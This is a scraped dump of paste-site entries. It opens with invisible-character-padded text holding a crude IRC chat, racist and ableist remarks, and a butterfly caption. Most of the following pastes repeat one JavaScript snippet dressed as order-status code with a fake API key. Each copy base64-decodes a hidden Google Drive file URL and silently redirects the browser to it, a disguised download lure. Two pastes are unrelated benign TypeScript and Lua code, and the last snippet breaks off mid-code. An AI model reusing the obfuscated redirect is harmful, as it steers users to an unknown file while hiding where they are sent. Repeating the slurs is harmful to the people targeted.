‎t‎h‎e‎ ‎h‎o‎o‎k‎e‎r‎s‎ ‎t‎o‎ ‎h‎i‎s‎ ‎b‎l‎o‎w‎.‎ ‎A‎b‎o‎v‎e‎ ‎a‎l‎l‎,‎ ‎D‎i‎s‎n‎e‎y‎ ‎i‎s‎ ‎a‎ ‎m‎a‎s‎t‎e‎r‎ ‎a‎t‎ ‎t‎h‎e‎ ‎a‎r‎t‎ ‎o‎f‎ ‎t‎r‎o‎l‎l‎i‎n‎g‎ ‎e‎v‎e‎r‎y‎o‎n‎e‎ ‎a‎n‎d‎ ‎s‎e‎n‎d‎i‎n‎g‎ ‎1‎6‎-‎y‎e‎a‎r‎-‎o‎l‎d‎ ‎s‎t‎a‎r‎s‎ ‎o‎u‎t‎ ‎t‎o‎ ‎t‎h‎e‎i‎r‎ ‎d‎o‎o‎m‎.‎

(‎(‎ ‎T‎H‎E‎Y‎ ‎o‎w‎n‎ ‎e‎v‎e‎r‎y‎t‎h‎i‎n‎g‎ ‎)‎)‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎W‎e‎l‎l‎ ‎I‎ ‎g‎u‎e‎s‎s‎ ‎i‎t‎'‎s‎ ‎t‎i‎m‎e‎ ‎f‎o‎r‎ ‎t‎h‎o‎s‎e‎ ‎p‎o‎o‎ ‎s‎t‎a‎b‎b‎e‎r‎s‎ ‎a‎g‎a‎i‎n‎.‎ ‎#‎L‎R‎H‎:‎

[‎1‎6‎:‎3‎8‎]‎ ‎<‎@‎s‎t‎r‎a‎t‎u‎m‎>‎ ‎b‎i‎g‎ ‎n‎e‎w‎s‎
[‎1‎6‎:‎3‎9‎]‎ ‎<‎@‎s‎t‎r‎a‎t‎u‎m‎>‎ ‎a‎u‎t‎i‎s‎m‎ ‎g‎o‎n‎n‎a‎ ‎b‎e‎ ‎c‎u‎r‎e‎d‎ ‎b‎y‎ ‎t‎h‎e‎ ‎e‎n‎d‎ ‎o‎f‎ ‎t‎h‎e‎ ‎s‎u‎m‎m‎e‎r‎
[‎1‎6‎:‎3‎9‎]‎ ‎<‎+‎c‎h‎z‎z‎>‎ ‎w‎e‎ ‎a‎l‎r‎e‎a‎d‎y‎ ‎k‎n‎o‎w‎ ‎i‎t‎'‎s‎ ‎c‎a‎u‎s‎e‎d‎ ‎b‎y‎ ‎i‎n‎c‎r‎e‎a‎s‎e‎d‎ ‎i‎n‎c‎i‎d‎e‎n‎c‎e‎ ‎o‎f‎ ‎g‎e‎r‎i‎a‎t‎r‎i‎c‎ ‎p‎r‎e‎g‎n‎a‎n‎c‎i‎e‎s‎
[‎1‎6‎:‎3‎9‎]‎ ‎<‎+‎l‎o‎c‎k‎i‎e‎>‎ ‎i‎t‎'‎s‎ ‎p‎s‎y‎c‎h‎ ‎m‎e‎d‎s‎
[‎1‎6‎:‎3‎9‎]‎ ‎<‎+‎j‎r‎r‎a‎_‎>‎ ‎n‎a‎h‎,‎ ‎i‎t‎'‎s‎ ‎c‎a‎u‎s‎e‎d‎ ‎b‎y‎ ‎g‎a‎y‎ ‎c‎o‎o‎t‎i‎e‎s‎
[‎1‎6‎:‎3‎9‎]‎ ‎<‎+‎G‎r‎o‎u‎n‎d‎e‎d‎0‎>‎ ‎i‎f‎ ‎y‎o‎u‎ ‎g‎e‎t‎ ‎c‎h‎i‎c‎k‎s‎ ‎p‎r‎e‎g‎g‎e‎r‎ ‎a‎t‎ ‎o‎v‎e‎r‎ ‎3‎5‎
[‎1‎6‎:‎3‎9‎]‎ ‎<‎+‎j‎r‎r‎a‎_‎>‎ ‎m‎y‎ ‎e‎x‎p‎l‎a‎n‎a‎t‎i‎o‎n‎ ‎i‎s‎ ‎m‎o‎s‎t‎ ‎p‎l‎a‎u‎s‎i‎b‎l‎e‎
‎0‎3‎[‎1‎6‎:‎3‎9‎]‎ ‎*‎ ‎P‎a‎r‎f‎i‎n‎g‎ ‎(‎~‎P‎a‎r‎f‎@‎8‎9‎.‎4‎5‎.‎4‎.‎1‎4‎)‎ ‎h‎a‎s‎ ‎j‎o‎i‎n‎e‎d‎ ‎#‎L‎R‎H‎
[‎1‎6‎:‎4‎0‎]‎ ‎<‎+‎G‎r‎o‎u‎n‎d‎e‎d‎0‎>‎ ‎t‎h‎e‎ ‎k‎i‎d‎ ‎i‎s‎ ‎m‎u‎c‎h‎ ‎m‎o‎r‎e‎ ‎l‎i‎k‎e‎l‎y‎ ‎t‎o‎ ‎h‎a‎v‎e‎ ‎'‎t‎i‎s‎m‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

T‎h‎e‎ ‎g‎a‎t‎e‎k‎e‎e‎p‎e‎r‎ ‎(‎P‎y‎r‎o‎n‎i‎a‎ ‎t‎i‎t‎h‎o‎n‎u‎s‎)‎ ‎i‎s‎ ‎a‎ ‎s‎p‎e‎c‎i‎e‎s‎ ‎o‎f‎ ‎b‎u‎t‎t‎e‎r‎f‎l‎y‎ ‎i‎n‎ ‎t‎h‎e‎ ‎f‎a‎m‎i‎l‎y‎ ‎N‎y‎m‎p‎h‎a‎l‎i‎d‎a‎e‎.‎ ‎F‎o‎u‎n‎d‎ ‎a‎c‎r‎o‎s‎s‎ ‎E‎u‎r‎o‎p‎e‎,‎ ‎i‎t‎ ‎i‎s‎ ‎t‎y‎p‎i‎c‎a‎l‎l‎y‎ ‎o‎r‎a‎n‎g‎e‎ ‎w‎i‎t‎h‎ ‎t‎w‎o‎ ‎l‎a‎r‎g‎e‎ ‎b‎r‎o‎w‎n‎ ‎s‎p‎o‎t‎s‎ ‎o‎n‎ ‎i‎t‎s‎ ‎w‎i‎n‎g‎s‎ ‎a‎n‎d‎ ‎a‎ ‎b‎r‎o‎w‎n‎ ‎p‎a‎t‎t‎e‎r‎n‎ ‎o‎n‎ ‎t‎h‎e‎ ‎e‎d‎g‎e‎ ‎o‎f‎ ‎i‎t‎s‎ ‎w‎i‎n‎g‎s‎,‎ ‎a‎l‎t‎h‎o‎u‎g‎h‎ ‎a‎ ‎l‎a‎r‎g‎e‎ ‎n‎u‎m‎b‎e‎r‎ ‎o‎f‎ ‎a‎b‎e‎r‎r‎a‎n‎t‎ ‎f‎o‎r‎m‎s‎ ‎a‎r‎e‎ ‎k‎n‎o‎w‎n‎.‎ ‎T‎h‎e‎ ‎e‎y‎e‎s‎p‎o‎t‎s‎ ‎o‎n‎ ‎t‎h‎e‎ ‎f‎o‎r‎e‎ ‎w‎i‎n‎g‎s‎ ‎m‎o‎s‎t‎ ‎l‎i‎k‎e‎l‎y‎ ‎r‎e‎d‎u‎c‎e‎ ‎b‎i‎r‎d‎ ‎a‎t‎t‎a‎c‎k‎s‎;‎ ‎t‎h‎e‎ ‎g‎a‎t‎e‎k‎e‎e‎p‎e‎r‎ ‎i‎s‎ ‎t‎h‎e‎r‎e‎f‎o‎r‎e‎ ‎o‎f‎t‎e‎n‎ ‎s‎e‎e‎n‎ ‎r‎e‎s‎t‎i‎n‎g‎ ‎w‎i‎t‎h‎ ‎i‎t‎s‎ ‎w‎i‎n‎g‎s‎ ‎o‎p‎e‎n‎.‎ ‎C‎o‎l‎o‎n‎i‎e‎s‎ ‎v‎a‎r‎y‎ ‎i‎n‎ ‎s‎i‎z‎e‎ ‎d‎e‎p‎e‎n‎d‎i‎n‎g‎ ‎o‎n‎ ‎t‎h‎e‎ ‎a‎v‎a‎i‎l‎a‎b‎l‎e‎ ‎h‎a‎b‎i‎t‎a‎t‎,‎ ‎a‎n‎d‎ ‎c‎a‎n‎ ‎r‎a‎n‎g‎e‎ ‎f‎r‎o‎m‎ ‎a‎ ‎f‎e‎w‎ ‎d‎o‎z‎e‎n‎ ‎t‎o‎ ‎s‎e‎v‎e‎r‎a‎l‎ ‎t‎h‎o‎u‎s‎a‎n‎d‎ ‎b‎u‎t‎t‎e‎r‎f‎l‎i‎e‎s‎.‎ ‎T‎h‎i‎s‎ ‎m‎a‎l‎e‎ ‎g‎a‎t‎e‎k‎e‎e‎p‎e‎r‎ ‎w‎a‎s‎ ‎p‎h‎o‎t‎o‎g‎r‎a‎p‎h‎e‎d‎ ‎i‎n‎ ‎B‎e‎r‎n‎w‎o‎o‎d‎ ‎F‎o‎r‎e‎s‎t‎ ‎i‎n‎ ‎B‎u‎c‎k‎i‎n‎g‎h‎a‎m‎s‎h‎i‎r‎e‎,‎ ‎E‎n‎g‎l‎a‎n‎d‎.‎ ‎T‎h‎e‎ ‎p‎h‎o‎t‎o‎g‎r‎a‎p‎h‎ ‎w‎a‎s‎ ‎f‎o‎c‎u‎s‎-‎s‎t‎a‎c‎k‎e‎d‎ ‎f‎r‎o‎m‎ ‎1‎5‎ ‎s‎e‎p‎a‎r‎a‎t‎e‎ ‎i‎m‎a‎g‎e‎s‎.‎

P‎h‎o‎t‎o‎g‎r‎a‎p‎h‎ ‎c‎r‎e‎d‎i‎t‎:‎ ‎C‎h‎a‎r‎l‎e‎s‎ ‎J‎.‎ ‎S‎h‎a‎r‎p‎

.‎.‎.‎.‎.‎.‎.‎.‎

B‎y‎e‎,‎ ‎g‎u‎y‎s‎.‎ ‎I‎'‎m‎ ‎g‎o‎n‎n‎a‎ ‎g‎o‎ ‎t‎h‎r‎o‎w‎ ‎d‎a‎r‎t‎s‎ ‎a‎t‎ ‎s‎o‎m‎e‎ ‎S‎a‎m‎o‎a‎n‎s‎,‎ ‎t‎h‎e‎n‎ ‎I‎'‎m‎ ‎g‎o‎n‎n‎a‎ ‎g‎o‎ ‎j‎i‎z‎z‎ ‎o‎n‎ ‎s‎o‎m‎e‎ ‎a‎n‎t‎s‎,‎ ‎t‎h‎e‎n‎ ‎I‎'‎m‎ ‎g‎o‎n‎n‎a‎ ‎g‎o‎ ‎a‎ ‎p‎o‎r‎c‎u‎p‎i‎n‎e‎ ‎a‎t‎ ‎y‎o‎u‎r‎ ‎m‎o‎m‎.‎"
rQtQnp5x,Market.js,navrajkhunger,JavaScript,Thursday 10th of April 2025 04:47:17 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/68395/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
nK3N2eCv,Untitled,navrajkhunger,JavaScript,Thursday 10th of April 2025 04:31:54 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/90425/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
HFg6vjbx,Products.js,navrajkhunger,JavaScript,Thursday 10th of April 2025 04:16:31 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/09431/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
xkxEN9xz,Order.js,navrajkhunger,JavaScript,Thursday 10th of April 2025 04:01:09 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/98833/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
GkkUgrV5,Market.js,navrajkhunger,JavaScript,Thursday 10th of April 2025 03:45:46 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/89992/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
PLRScmh4,Untitled,uraniumanchor,TypeScript,Thursday 10th of April 2025 03:44:52 PM CDT,"import { Draft } from 'immer';
import {
  DefinitionsFromApi,
  InfiniteData,
  InfiniteQueryArgFrom,
  InfiniteQueryDefinition,
  MutationDefinition,
  PageParamFrom,
  QueryArgFrom,
  QueryDefinition,
  ResultTypeFrom,
  TypedMutationOnQueryStarted,
} from '@reduxjs/toolkit/query';
import { createApi, fetchBaseQuery } from '@reduxjs/toolkit/query/react';

interface Model {
  id: number;
  type: 'model';
  flibbertygibbits: number;
}

interface Other {
  id: number;
  type: 'other';
  foobars: number;
}

const baseApi = createApi({
  baseQuery: fetchBaseQuery(),
  endpoints: build => ({
    models: build.query<Model[], { id?: number } | void>({
      query: ({ id } = {}) => `models/${id != null ? `${id}/` : ''}`,
    }),
    // allModels: build.infiniteQuery<Model[], { id?: number } | void, number>({
    //   query: ({ queryArg: { id } = {}, pageParam }) => `models/${id != null ? `${id}/` : ''}`,
    //   infiniteQueryOptions: {
    //     initialPageParam: 1,
    //     getNextPageParam: (lastPage, allPages, lastPageParam, allPageParams) => lastPageParam + 1,
    //   },
    // }),
    mutateModel: build.mutation<Model, { id: number; flibberygibbits: number }>({
      query: ({ id }) => `models/${id}`,
    }),
    // others: build.query<Other[], { id?: number } | void>({
    //   query: ({ id } = {}) => `others/${id != null ? `${id}/` : ''}`,
    // }),
    // mutateOther: build.mutation<Other, { id: number; foobars: number }>({
    //   query: ({ id }) => `others/${id}`,
    // }),
  }),
});

type ApiEndpointDefinitions = DefinitionsFromApi<typeof baseApi>;
type ApiQueryEndpoints = {
  [K in keyof ApiEndpointDefinitions as ApiEndpointDefinitions[K] extends QueryDefinition<any, any, any, any>
    ? K
    : never]: ApiEndpointDefinitions[K];
};
type ApiInfiniteQueryEndpoints = {
  [K in keyof ApiEndpointDefinitions as ApiEndpointDefinitions[K] extends InfiniteQueryDefinition<
    any,
    any,
    any,
    any,
    any
  >
    ? K
    : never]: ApiEndpointDefinitions[K];
};
type ApiMutationEndpoints = {
  [K in keyof ApiEndpointDefinitions as ApiEndpointDefinitions[K] extends MutationDefinition<any, any, any, any>
    ? K
    : never]: ApiEndpointDefinitions[K];
};

function optimisticMutation<
  const K extends keyof ApiQueryEndpoints | keyof ApiInfiniteQueryEndpoints,
  const MK extends keyof ApiMutationEndpoints,
>(k: K, mk: MK) {
  type OriginalArgs = K extends keyof ApiQueryEndpoints
    ? QueryArgFrom<ApiEndpointDefinitions[K]>
    : K extends keyof ApiInfiniteQueryEndpoints
      ? InfiniteQueryArgFrom<ApiEndpointDefinitions[K]>
      : never;
  type MutationArgs = QueryArgFrom<ApiEndpointDefinitions[MK]>;
  type QueryData = K extends keyof ApiQueryEndpoints
    ? ResultTypeFrom<ApiEndpointDefinitions[K]>
    : K extends keyof ApiInfiniteQueryEndpoints
      ? InfiniteData<ResultTypeFrom<ApiEndpointDefinitions[K]>, PageParamFrom<ApiEndpointDefinitions[K]>>
      : never;
  type MutationData = ResultTypeFrom<ApiEndpointDefinitions[MK]>;
  type Recipe = (draftData: QueryData | Draft<QueryData>) => void | QueryData | Draft<QueryData>;
  return (
    optimistic: (originalArgs: OriginalArgs, mutationArgs: MutationArgs) => Recipe,
    pessimistic?: (originalArgs: OriginalArgs, mutationArgs: MutationArgs, data: MutationData) => Recipe,
  ): NonNullable<TypedMutationOnQueryStarted<MutationData, MutationArgs, ReturnType<typeof fetchBaseQuery>>> => {
    return async (mutationArgs, api) => {
      const undo = baseApi.util
        .selectCachedArgsForQuery(api.getState(), k)
        .map(
          originalArgs =>
            api.dispatch(baseApi.util.updateQueryData(k, originalArgs, optimistic(originalArgs, mutationArgs))).undo,
        );
      try {
        const { data: result } = await api.queryFulfilled;
        if (pessimistic) {
          baseApi.util
            .selectCachedArgsForQuery(api.getState(), k)
            .forEach(originalArgs =>
              api.dispatch(
                baseApi.util.updateQueryData(k, originalArgs, pessimistic(originalArgs, mutationArgs, result)),
              ),
            );
        }
      } catch {
        undo.forEach(u => u());
        // nothing
      }
    };
  };
}

export const enhancedApi = baseApi.enhanceEndpoints({
  endpoints: {
    mutateModel: {
      onQueryStarted: optimisticMutation('models', 'mutateModel')(
        (originalArgs, mutationArgs) => drafts => {
          const i = drafts.findIndex(d => d.id === mutationArgs.id);
          if (i !== -1) {
            // optimistic update based on client mutation
            drafts[i].flibbertygibbits = mutationArgs.flibberygibbits;
          }
        },
        (originalArgs, mutationArgs, data) => drafts => {
          const i = drafts.findIndex(d => d.id === mutationArgs.id);
          if (i !== -1) {
            // pessimistic update based on server response
            drafts[i] = { ...drafts[i], ...data };
          }
        },
      ),
    },
  },
});
"
vfTkHiu6,sticks,HappySunChild,Lua,Thursday 10th of April 2025 03:44:12 PM CDT,"---@param slot number
local function drop(slot)
	turtle.select(slot)
	turtle.dropUp(64)
end

---@param slot number
local function store(slot)
	turtle.select(slot)
	turtle.dropDown(64)
end

local function processPlanks()
	turtle.select(1)
	turtle.craft(64)

	for slot = 1, 4 do
		store(slot)
	end
end

local function processLogs()
	turtle.select(1)
	turtle.craft(64)

	turtle.select(2)
	turtle.transferTo(5)

	drop(3)
	drop(4)

	processPlanks()

	turtle.select(1)
	turtle.suckUp(64)
	turtle.select(5)
	turtle.suckUp(64)

	processPlanks()
end

local function main()
	print(""Processing logs"")

	while true do
		if not turtle.suck(64) then
			break
		end

		processLogs()
	end

	print(""no more logs"")
end

main()
"
9AF5dR08,Untitled,navrajkhunger,JavaScript,Thursday 10th of April 2025 03:30:23 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/38461/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
JC89uBJw,Products.js,navrajkhunger,JavaScript,Thursday 10th of April 2025 03:14:38 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/33450/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
f9cfjJcQ,Order.js,navrajkhunger,JavaScript,Thursday 10th of April 2025 02:58:44 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/88731/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
KdjdxhbQ,Market.js,navrajkhunger,JavaScript,Thursday 10th of April 2025 02:43:21 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/65174/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
tMdpmPkT,Untitled,navrajkhunger,JavaScript,Thursday 10th of April 2025 02:27:57 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/69455/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
iMHeaZWc,Products.js,navrajkhunger,JavaScript,Thursday 10th of April 2025 02:12:35 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/45000/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
BDxtvn4M,Order.js,navrajkhunger,JavaScript,Thursday 10th of April 2025 01:57:13 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/74692/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
